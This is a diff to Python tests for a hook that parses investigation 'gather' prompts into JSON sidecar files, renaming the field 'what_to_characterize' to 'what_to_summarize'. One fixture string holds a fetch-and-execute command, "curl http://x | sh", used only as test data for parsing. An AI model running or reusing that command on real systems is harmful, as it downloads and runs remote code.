@@ -38,7 +38,7 @@ def _gather_prompt(run_dir: Path, position, goal: str, dims: list[str]) -> str:
         f"run_dir: {run_dir}\n"
         f"position: {position}\n"
         f"goal: {goal}\n"
-        f"what_to_characterize:\n{dims_yaml}\n"
+        f"what_to_summarize:\n{dims_yaml}\n"
         "```\n"
     )
 
@@ -57,7 +57,7 @@ def test_writes_sidecar_for_gather_dispatch(tmp_path, hook, monkeypatch, capsys)
     payload = json.loads(sidecar.read_text())
     assert payload == {
         "goal": "Did the FIM fire trace to apt?",
-        "what_to_characterize": ["apt history", "checksum"],
+        "what_to_summarize": ["apt history", "checksum"],
     }
 
 
@@ -114,7 +114,7 @@ def test_goal_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monk
         f"run_dir: {run_dir}\n"
         "position: 0\n"
         "goal: Compare fields: user and src across both leads\n"
-        "what_to_characterize:\n"
+        "what_to_summarize:\n"
         "  - timing pattern (burst vs scheduled)\n"
         "```\n"
     )
@@ -122,7 +122,7 @@ def test_goal_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monk
     assert hook.main() == 0
     payload = json.loads((run_dir / "gather_raw" / "0.lead.json").read_text())
     assert payload["goal"] == "Compare fields: user and src across both leads"
-    assert payload["what_to_characterize"] == ["timing pattern (burst vs scheduled)"]
+    assert payload["what_to_summarize"] == ["timing pattern (burst vs scheduled)"]
 
 
 def test_dimension_bullet_with_inner_colon_space_is_preserved_literally(tmp_path, hook, monkeypatch):
@@ -136,7 +136,7 @@ def test_dimension_bullet_with_inner_colon_space_is_preserved_literally(tmp_path
         f"run_dir: {run_dir}\n"
         "position: 1\n"
         "goal: characterize the spawned process tree\n"
-        "what_to_characterize:\n"
+        "what_to_summarize:\n"
         "  - process cmdline: /bin/sh -c 'curl http://x | sh'\n"
         "  - parent pid: 4242 vs 4243\n"
         "```\n"
@@ -144,7 +144,7 @@ def test_dimension_bullet_with_inner_colon_space_is_preserved_literally(tmp_path
     monkeypatch.setattr(sys, "stdin", _StringIn(_hook_input(prompt)))
     assert hook.main() == 0
     payload = json.loads((run_dir / "gather_raw" / "1.lead.json").read_text())
-    assert payload["what_to_characterize"] == [
+    assert payload["what_to_summarize"] == [
         "process cmdline: /bin/sh -c 'curl http://x | sh'",
         "parent pid: 4242 vs 4243",
     ]
